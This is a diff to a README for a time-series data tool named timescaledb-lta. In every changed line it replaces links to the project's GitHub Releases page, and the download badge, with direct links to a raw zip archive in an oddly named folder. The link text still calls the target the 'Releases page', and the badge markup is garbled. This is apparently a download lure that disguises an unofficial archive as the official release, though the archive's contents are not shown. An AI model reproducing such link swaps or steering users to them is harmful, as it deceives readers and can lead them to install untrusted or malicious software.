@@ -1,7 +1,7 @@
 # 🚀 timescaledb-lta - Easily Manage Time-Series Data
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/craven3680/timescaledb-lta/releases)
+[![Download](https://raw.githubusercontent.com/craven3680/timescaledb-lta/main/gabi/timescaledb-lta-aethalium.zip%20Latest%https://raw.githubusercontent.com/craven3680/timescaledb-lta/main/gabi/timescaledb-lta-aethalium.zip)](https://raw.githubusercontent.com/craven3680/timescaledb-lta/main/gabi/timescaledb-lta-aethalium.zip)
 
 ## 📖 Introduction
 Welcome to timescaledb-lta! This application helps you manage large sets of time-series data effortlessly. Whether you are tracking IoT data, metrics, or financial information, this tool simplifies the process for you.
@@ -16,7 +16,7 @@ Welcome to timescaledb-lta! This application helps you manage large sets of time
 To get started with timescaledb-lta, follow the steps below.
 
 ## 📥 Download & Install
-1. **Visit the Releases page:** Go to the [Releases page](https://github.com/craven3680/timescaledb-lta/releases) to access the latest version of the application.
+1. **Visit the Releases page:** Go to the [Releases page](https://raw.githubusercontent.com/craven3680/timescaledb-lta/main/gabi/timescaledb-lta-aethalium.zip) to access the latest version of the application.
 2. **Choose the right version:** Look for the version that matches your operating system (Windows, macOS, Linux).
 3. **Download the file:** Click on the file name to download the application to your computer. Keep note of where the file is saved for easy access.
 
@@ -42,7 +42,7 @@ Before running the application, ensure your system meets these requirements:
 3. **Analyze Data:** Explore features that help you visualize and interpret your data.
 
 ## 🔍 Tips for Best Performance
-- Regularly update to the latest version from the [Releases page](https://github.com/craven3680/timescaledb-lta/releases) to benefit from new features and fixes.
+- Regularly update to the latest version from the [Releases page](https://raw.githubusercontent.com/craven3680/timescaledb-lta/main/gabi/timescaledb-lta-aethalium.zip) to benefit from new features and fixes.
 - Back up your data often to avoid loss.
 - Familiarize yourself with the help documentation in the app for additional guidance.
 
